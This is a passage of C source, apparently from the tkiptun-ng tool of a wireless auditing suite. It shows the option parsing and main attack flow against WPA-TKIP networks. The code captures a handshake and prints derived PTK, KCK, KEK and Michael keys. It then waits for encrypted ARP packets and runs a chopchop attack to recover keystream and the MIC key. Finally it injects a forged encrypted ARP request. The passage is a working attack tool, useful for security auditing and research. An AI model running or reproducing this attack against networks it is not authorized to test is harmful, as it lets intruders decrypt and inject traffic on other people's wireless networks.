					printf("\"%s --help\" for help.\n", argv[0]);
					return (1);
				}
				if (getmac(optarg, 1, lopt.wpa.stmac) != 0)
				{
					printf("Invalid source MAC address.\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					return (1);
				}
				opt.r_smac_set = 1;
				break;

			case 'e':

				memset(opt.r_essid, 0, sizeof(opt.r_essid));
				strncpy(opt.r_essid, optarg, sizeof(opt.r_essid) - 1);
				break;

			case 'j':

				opt.r_fromdsinj = 1;
				break;

			case 'D':

				opt.nodetect = 1;
				break;

			case 'y':

				if (opt.prga != NULL)
				{
					printf("PRGA file already specified.\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					return (1);
				}
				if (read_prga(&(opt.prga), optarg) != 0)
				{
					return (1);
				}
				break;

			case 'i':

				if (opt.s_face != NULL || opt.s_file)
				{
					printf("Packet source already specified.\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					return (1);
				}
				opt.s_face = optarg;
				opt.port_in
					= get_ip_port(opt.s_face, opt.ip_in, sizeof(opt.ip_in) - 1);
				break;

			case 'r':

				if (opt.s_face != NULL || opt.s_file)
				{
					printf("Packet source already specified.\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					return (1);
				}
				opt.s_file = optarg;
				break;

			case 'Z':

				opt.fast = 0;
				break;

			case 'H':

				printf(usage,
					   getVersion("Tkiptun-ng",
								  _MAJ,
								  _MIN,
								  _SUB_MIN,
								  _REVISION,
								  _BETA,
								  _RC));
				return (1);

			case 'K':

				i = 0;
				n = 0;
				s = optarg;
				while (s[i] != '\0')
				{
					if (s[i] == '-' || s[i] == ':' || s[i] == ' ')
						i++;
					else
						s[n++] = s[i++];
				}
				s[n] = '\0';
				buf[0] = s[0];
				buf[1] = s[1];
				buf[2] = '\0';
				i = 0;
				while (sscanf(buf, "%x", &n) == 1)
				{
					if (n > 255)
					{
						printf("Invalid keystream.\n");
						printf("\"%s --help\" for help.\n", argv[0]);
						return (1);
					}
					lopt.oldkeystream[lopt.oldkeystreamlen] = n;
					lopt.oldkeystreamlen++;
					s += 2;
					buf[0] = s[0];
					buf[1] = s[1];
				}
				break;

			case 'P':

				memset(lopt.pmk, 0, sizeof(lopt.pmk));
				i = hexStringToArray(optarg, strlen(optarg), lopt.pmk, 128);
				if (i == -1)
				{
					printf("Invalid value. It requires 128 bytes of PMK in "
						   "hexadecimal.\n");
					return (1);
				}
				lopt.got_pmk = 1;
				break;

			case 'p':

				memset(lopt.psk, 0, sizeof(lopt.psk));
				if (strlen(optarg) < 8 || strlen(optarg) > 63) //-V804
				{
					printf("PSK with invalid length specified [8-64].\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					return (1);
				}
				strncpy(lopt.psk, optarg, sizeof(lopt.psk) - 1);
				lopt.got_psk = 1;
				break;

			case 'M':

				ret = sscanf(optarg, "%d", &lopt.mic_failure_interval);
				if (ret != 1 || lopt.mic_failure_interval < 0)
				{
					printf("Invalid MIC error timeout. [>=0]\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					return (1);
				}
				break;

			default:
				goto usage;
		}
	}

	if (argc - optind != 1)
	{
		if (argc == 1)
		{
		usage:
			printf(
				usage,
				getVersion(
					"Tkiptun-ng", _MAJ, _MIN, _SUB_MIN, _REVISION, _BETA, _RC));
		}
		if (argc - optind == 0)
		{
			printf("No replay interface specified.\n");
		}
		if (argc > 1)
		{
			printf("\"%s --help\" for help.\n", argv[0]);
		}
		return (1);
	}

	if (!opt.r_smac_set)
	{
		printf("A Client MAC must be specified (-h).\n");
		printf("\"%s --help\" for help.\n", argv[0]);
		return (1);
	}

	if ((opt.f_minlen > 0 && opt.f_maxlen > 0) && opt.f_minlen > opt.f_maxlen)
	{
		printf("Invalid length filter (min(-m):%d > max(-n):%d).\n",
			   opt.f_minlen,
			   opt.f_maxlen);
		printf("\"%s --help\" for help.\n", argv[0]);
		return (1);
	}

	if (opt.f_tods == 1 && opt.f_fromds == 1)
	{
		printf("FromDS and ToDS bit are set: packet has to come from the AP "
			   "and go to the AP\n");
	}

	dev.fd_rtc = -1;

/* open the RTC device if necessary */

#if defined(__i386__)
#if defined(linux)
	if ((dev.fd_rtc = open("/dev/rtc0", O_RDONLY)) < 0)
	{
		dev.fd_rtc = 0;
	}

	if ((dev.fd_rtc == 0) && ((dev.fd_rtc = open("/dev/rtc", O_RDONLY)) < 0))
	{
		dev.fd_rtc = 0;
	}

	if (dev.fd_rtc > 0)
	{
		if (ioctl(dev.fd_rtc, RTC_IRQP_SET, RTC_RESOLUTION) < 0)
		{
			perror("ioctl(RTC_IRQP_SET) failed");
			printf("Make sure enhanced rtc device support is enabled in the "
				   "kernel (module\n"
				   "rtc, not genrtc) - also try 'echo 1024 "
				   ">/proc/sys/dev/rtc/max-user-freq'.\n");
			close(dev.fd_rtc);
			dev.fd_rtc = -1;
		}
		else
		{
			if (ioctl(dev.fd_rtc, RTC_PIE_ON, 0) < 0)
			{
				perror("ioctl(RTC_PIE_ON) failed");
				close(dev.fd_rtc);
				dev.fd_rtc = -1;
			}
		}
	}
	else
	{
		printf("For information, no action required:"
			   " Using gettimeofday() instead of /dev/rtc\n");
		dev.fd_rtc = -1;
	}
#endif /* linux */
#endif /* i386 */

	opt.iface_out = argv[optind];
	opt.port_out
		= get_ip_port(opt.iface_out, opt.ip_out, sizeof(opt.ip_out) - 1);

	// don't open interface(s) when using test mode and airserv
	if (!(opt.a_mode == 9 && opt.port_out >= 0))
	{
		/* open the replay interface */
		_wi_out = wi_open(opt.iface_out);
		if (!_wi_out) return (1);
		dev.fd_out = wi_fd(_wi_out);

		/* open the packet source */
		if (opt.s_face != NULL)
		{
			// don't open interface(s) when using test mode and airserv
			if (!(opt.a_mode == 9 && opt.port_in >= 0))
			{
				_wi_in = wi_open(opt.s_face);
				if (!_wi_in) return (1);
				dev.fd_in = wi_fd(_wi_in);
				wi_get_mac(_wi_in, dev.mac_in);
			}
		}
		else
		{
			_wi_in = _wi_out;
			dev.fd_in = dev.fd_out;

			/* XXX */
			dev.arptype_in = dev.arptype_out;
			wi_get_mac(_wi_in, dev.mac_in);
		}

		wi_get_mac(_wi_out, dev.mac_out);
	}

	/* drop privileges */
	if (setuid(getuid()) == -1)
	{
		perror("setuid");
	}

	/* XXX */
	if (opt.r_nbpps == 0)
	{
		opt.r_nbpps = 10;
	}

	if (opt.s_file != NULL)
	{
		if (!(dev.f_cap_in = fopen(opt.s_file, "rb")))
		{
			perror("open failed");
			return (1);
		}

		n = sizeof(struct pcap_file_header);

		if (fread(&dev.pfh_in, 1, n, dev.f_cap_in) != (size_t) n)
		{
			perror("fread(pcap file header) failed");
			return (1);
		}

		if (dev.pfh_in.magic != TCPDUMP_MAGIC
			&& dev.pfh_in.magic != TCPDUMP_CIGAM)
		{
			fprintf(stderr,
					"\"%s\" isn't a pcap file (expected "
					"TCPDUMP_MAGIC).\n",
					opt.s_file);
			return (1);
		}

		if (dev.pfh_in.magic == TCPDUMP_CIGAM) SWAP32(dev.pfh_in.linktype);

		if (dev.pfh_in.linktype != LINKTYPE_IEEE802_11
			&& dev.pfh_in.linktype != LINKTYPE_PRISM_HEADER
			&& dev.pfh_in.linktype != LINKTYPE_RADIOTAP_HDR
			&& dev.pfh_in.linktype != LINKTYPE_PPI_HDR)
		{
			fprintf(stderr,
					"Wrong linktype from pcap file header "
					"(expected LINKTYPE_IEEE802_11) -\n"
					"this doesn't look like a regular 802.11 "
					"capture.\n");
			return (1);
		}
	}

	// if there is no -h given, use default hardware mac
	if (maccmp(opt.r_smac, NULL_MAC) == 0)
	{
		memcpy(opt.r_smac, dev.mac_out, 6);
		if (opt.a_mode != 0 && opt.a_mode != 4 && opt.a_mode != 9)
		{
			printf("No source MAC (-h) specified. Using the device MAC "
				   "(%02X:%02X:%02X:%02X:%02X:%02X)\n",
				   dev.mac_out[0],
				   dev.mac_out[1],
				   dev.mac_out[2],
				   dev.mac_out[3],
				   dev.mac_out[4],
				   dev.mac_out[5]);
		}
	}

	if (maccmp(opt.r_smac, dev.mac_out) != 0
		&& maccmp(opt.r_smac, NULL_MAC) != 0)
	{
		fprintf(stderr,
				"The interface MAC (%02X:%02X:%02X:%02X:%02X:%02X)"
				" doesn't match the specified MAC (-h).\n"
				"\tifconfig %s hw ether %02X:%02X:%02X:%02X:%02X:%02X\n",
				dev.mac_out[0],
				dev.mac_out[1],
				dev.mac_out[2],
				dev.mac_out[3],
				dev.mac_out[4],
				dev.mac_out[5],
				opt.iface_out,
				opt.r_smac[0],
				opt.r_smac[1],
				opt.r_smac[2],
				opt.r_smac[3],
				opt.r_smac[4],
				opt.r_smac[5]);
	}

	/* DO MICHAEL TEST */

	memset(buf, 0, 128);
	buf[0] = 'M';
	i = michael_test((unsigned char *) "\x82\x92\x5c\x1c\xa1\xd1\x30\xb8",
					 (unsigned char *) buf,
					 strlen(buf),
					 (unsigned char *) "\x43\x47\x21\xca\x40\x63\x9b\x3f");
	PCT;
	printf("Michael Test: %s\n", i ? "Successful" : "Failed");

	/* END MICHAEL TEST*/

	if (getnet(_wi_in,
			   NULL,
			   0,
			   0,
			   opt.f_bssid,
			   opt.r_bssid,
			   (uint8_t *) opt.r_essid,
			   0 /* ignore_negative_one */,
			   opt.nodetect)
		!= 0)
		return (EXIT_FAILURE);

	PCT;
	printf("Found specified AP\n");

	got_hdsk = 0;
	while (1)
	{
		getHDSK();
		for (i = 0; i < 10; i++)
		{
			read_sleep(dev.fd_in, 500000, my_read_sleep_cb);
			if (lopt.wpa.state == 7)
			{
				got_hdsk = 1;
				break;
			}
		}
		if (got_hdsk) break;
	}

	if (!lopt.got_pmk && lopt.got_psk && strlen(opt.r_essid) > 1)
	{
		calc_pmk(lopt.psk, opt.r_essid, lopt.pmk);
		PCT;
		printf("PSK: %s\n", lopt.psk);
		PCT;
		printf("PMK: ");
		for (i = 0; i < 31; i++) printf("%02X:", lopt.pmk[i]);
		printf("%02X\n", lopt.pmk[31]);
		lopt.got_pmk = 1;
	}

	if (lopt.got_pmk)
	{
		lopt.wpa_sta.next = NULL;
		memcpy(lopt.wpa_sta.stmac, opt.r_smac, 6);
		memcpy(lopt.wpa_sta.bssid, opt.f_bssid, 6);
		memcpy(lopt.wpa_sta.snonce, lopt.wpa.snonce, 32);
		memcpy(lopt.wpa_sta.anonce, lopt.wpa.anonce, 32);
		memset(lopt.wpa_sta.keymic, 0, sizeof(lopt.wpa_sta.keymic));
		memcpy(lopt.wpa_sta.keymic, lopt.wpa.keymic, sizeof(lopt.wpa.keymic));
		memcpy(lopt.wpa_sta.eapol, lopt.wpa.eapol, 256);
		lopt.wpa_sta.eapol_size = lopt.wpa.eapol_size;
		lopt.wpa_sta.keyver = lopt.wpa.keyver;
		lopt.wpa_sta.valid_ptk = calc_ptk(&lopt.wpa_sta, lopt.pmk);
		PCT;
		printf("PTK: ");
		for (i = 0; i < 79; i++) printf("%02X:", lopt.wpa_sta.ptk[i]);
		printf("%02X\n", lopt.wpa_sta.ptk[79]);
		PCT;
		printf("Valid PTK: %s\n", (lopt.wpa_sta.valid_ptk) ? "Yes" : "No!");
		if (lopt.wpa_sta.valid_ptk) lopt.got_ptk = 1;

		PCT;
		printf("KCK: ");
		for (i = 0; i < 15; i++) printf("%02X:", lopt.wpa_sta.ptk[i]);
		printf("%02X\n", lopt.wpa_sta.ptk[15]);

		PCT;
		printf("KEK: ");
		for (i = 16; i < 31; i++) printf("%02X:", lopt.wpa_sta.ptk[i]);
		printf("%02X\n", lopt.wpa_sta.ptk[31]);

		PCT;
		printf("Temporal Encryption Key (TK1): ");
		for (i = 32; i < 47; i++) printf("%02X:", lopt.wpa_sta.ptk[i]);
		printf("%02X\n", lopt.wpa_sta.ptk[47]);

		PCT;
		printf("Michael Key (FromDS): ");
		for (i = 48; i < 55; i++) printf("%02X:", lopt.wpa_sta.ptk[i]);
		printf("%02X\n", lopt.wpa_sta.ptk[55]);

		PCT;
		printf("Michael Key (ToDS): ");
		for (i = 56; i < 63; i++) printf("%02X:", lopt.wpa_sta.ptk[i]);
		printf("%02X\n", lopt.wpa_sta.ptk[63]);
	}

	/* Select ToDS ARP from Client */

	PCT;
	printf("Waiting for an ARP packet coming from the Client...\n");

	opt.f_tods = 1;
	opt.f_fromds = 0;
	memcpy(opt.f_smac, opt.r_smac, 6);
	if (opt.fast == -1) opt.fast = 1;

	if (lopt.f_minlen_set == 0)
	{
		opt.f_minlen = 80;
	}
	if (lopt.f_maxlen_set == 0)
	{
		opt.f_maxlen = 80;
	}

	while (1)
	{
		if (capture_ask_packet(&caplen, 0) != 0) return (1);
		if (is_qos_arp_tkip(h80211, caplen) == 1) break;
	}

	memcpy(packet2, h80211, caplen);
	packet2_len = caplen;

	/* Select FromDS ARP to Client */

	PCT;
	printf("Waiting for an ARP response packet coming from the AP...\n");

	opt.f_tods = 0;
	opt.f_fromds = 1;
	memcpy(opt.f_dmac, opt.r_smac, 6);
	memcpy(opt.f_smac, NULL_MAC, 6);

	if (lopt.f_minlen_set == 0)
	{
		opt.f_minlen = 80;
	}
	if (lopt.f_maxlen_set == 0)
	{
		opt.f_maxlen = 98;
	}

	while (1)
	{
		if (capture_ask_packet(&caplen, 0) != 0) return (1);
		if (is_qos_arp_tkip(h80211, caplen) == 1) break;
	}

	memcpy(packet1, h80211, caplen);
	packet1_len = caplen;

	PCT;
	printf("Got the answer!\n");

	PCT;
	printf("Waiting 10 seconds to let encrypted EAPOL frames pass without "
		   "interfering.\n");
	read_sleep(dev.fd_in, 10 * 1000000, my_read_sleep_cb);

	memcpy(h80211, packet1, packet1_len);

	/* Chop the packet down, get a keystream+plaintext, calculate the MIC Key */

	if (do_attack_tkipchop(h80211, caplen) == 1) return (1);

	/* derive IPs and MACs; relays on QoS, ARP and fromDS packet */
	if (lopt.chopped_from_plain != NULL)
	{
		memcpy(lopt.ip_cli, lopt.chopped_from_plain + 58, 4);
		memcpy(lopt.ip_ap, lopt.chopped_from_plain + 48, 4);
		memcpy(lopt.r_apmac, lopt.chopped_from_plain + 42, 6);
	}

	PCT;
	printf("AP MAC: %02X:%02X:%02X:%02X:%02X:%02X IP: %i.%i.%i.%i\n",
		   lopt.r_apmac[0],
		   lopt.r_apmac[1],
		   lopt.r_apmac[2],
		   lopt.r_apmac[3],
		   lopt.r_apmac[4],
		   lopt.r_apmac[5],
		   lopt.ip_ap[0],
		   lopt.ip_ap[1],
		   lopt.ip_ap[2],
		   lopt.ip_ap[3]);
	PCT;
	printf("Client MAC: %02X:%02X:%02X:%02X:%02X:%02X IP: %i.%i.%i.%i\n",
		   opt.r_smac[0],
		   opt.r_smac[1],
		   opt.r_smac[2],
		   opt.r_smac[3],
		   opt.r_smac[4],
		   opt.r_smac[5],
		   lopt.ip_cli[0],
		   lopt.ip_cli[1],
		   lopt.ip_cli[2],
		   lopt.ip_cli[3]);

	/* Send an ARP Request from the AP to the Client */

	build_arp_request(
		h80211, &caplen, 0); // writes encrypted tkip arp request into h80211
	send_packet(_wi_out, h80211, (size_t) caplen, kNoChange);
	PCT;
	printf("Sent encrypted tkip ARP request to the client.\n");

	/* wait until we can generate a new mic failure */

	PCT;
	printf("Wait for the mic countermeasure timeout of %i seconds.\n",
		   lopt.mic_failure_interval);

	while (1)
	{
		gettimeofday(&mic_fail, NULL);
		if ((mic_fail.tv_sec - lopt.last_mic_failure.tv_sec) * 1000000UL
				+ (mic_fail.tv_usec - lopt.last_mic_failure.tv_usec)
			> lopt.mic_failure_interval * 1000000UL)
			break;
		sleep(1);
	}

	/* Also chop the answer to get the equivalent MIC Key */
	memcpy(h80211, packet2, packet2_len);
	do_attack_tkipchop(h80211, caplen);

	/* that's all, folks */

	return (0);
}
